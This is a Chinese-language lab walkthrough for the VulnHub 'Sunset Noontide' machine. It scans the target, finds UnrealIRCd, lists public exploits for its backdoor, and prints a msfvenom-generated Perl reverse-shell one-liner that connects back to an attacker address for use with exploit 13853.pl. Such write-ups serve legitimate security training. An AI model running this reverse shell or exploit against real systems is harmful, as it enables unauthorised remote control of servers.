# SunsetNoontide

> https://download.vulnhub.com/sunset/noontide.ova

靶场IP：`192.168.2.11`

扫描对外端口服务

```
┌──(root㉿kali)-[/tmp]
└─# nmap -p1-65535 -sV 192.168.2.11
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-05 10:46 EDT
Nmap scan report for 192.168.2.11
Host is up (0.000086s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
6667/tcp open  irc     UnrealIRCd
6697/tcp open  irc     UnrealIRCd
8067/tcp open  irc     UnrealIRCd
MAC Address: 08:00:27:D1:0B:B3 (Oracle VirtualBox virtual NIC)
Service Info: Host: irc.foonet.com

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.23 seconds
                                                                   
```

搜索UnrealIRCd版本

```
┌──(root㉿kali)-[/tmp]
└─# searchsploit UnrealIRCd     
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)                                                                                                                                              | linux/remote/16922.rb
UnrealIRCd 3.2.8.1 - Local Configuration Stack Overflow                                                                                                                                                   | windows/dos/18011.txt
UnrealIRCd 3.2.8.1 - Remote Downloader/Execute                                                                                                                                                            | linux/remote/13853.pl
UnrealIRCd 3.x - Remote Denial of Service                                                                                                                                                                 | windows/dos/27407.pl
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                            
```

生成反弹shell

```
┌──(root㉿kali)-[/tmp]
└─# msfvenom -p cmd/unix/reverse_perl LHOST=192.168.2.5  LPORT=4444  -f raw
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 230 bytes
perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"192.168.2.5:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'

```

使用`13853.pl`，修改payload

![image-20220905230853007](../../.gitbook/assets/image-20220905230853007.png)
